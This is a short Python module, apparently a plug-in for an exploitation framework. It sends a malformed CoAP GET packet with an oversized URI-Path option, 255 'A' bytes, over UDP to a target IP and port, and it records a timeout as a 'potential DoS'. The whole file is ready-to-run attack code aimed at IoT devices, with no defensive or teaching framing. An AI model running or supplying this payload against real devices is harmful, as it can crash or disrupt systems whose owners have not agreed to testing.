import socket

def run(ip: str, port: int, **kwargs) -> dict:
    """
    Custom CoAP exploit - variant with different payload for port 5683
    """
    try:
        # CoAP GET request with oversized URI-Path option
        payload = bytes([
            0x40, 0x01, 0x12, 0x34,  # CoAP header
            0x00,                     # Empty token
            0xD0, 0xFF,              # Option 13 (URI-Path), Length 255
        ] + [0x41] * 255 +            # Fill with 'A'
            [0xFF, 0x00])             # Payload marker
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        sock.sendto(payload, (ip, port))
        
        try:
            resp = sock.recv(256)
            return {"success": True, "response": resp.hex(), "port": port}
        except socket.timeout:
            return {"success": True, "note": "Packet sent - potential DoS", "port": port}
    except Exception as e:
        return {"success": False, "error": str(e), "port": port}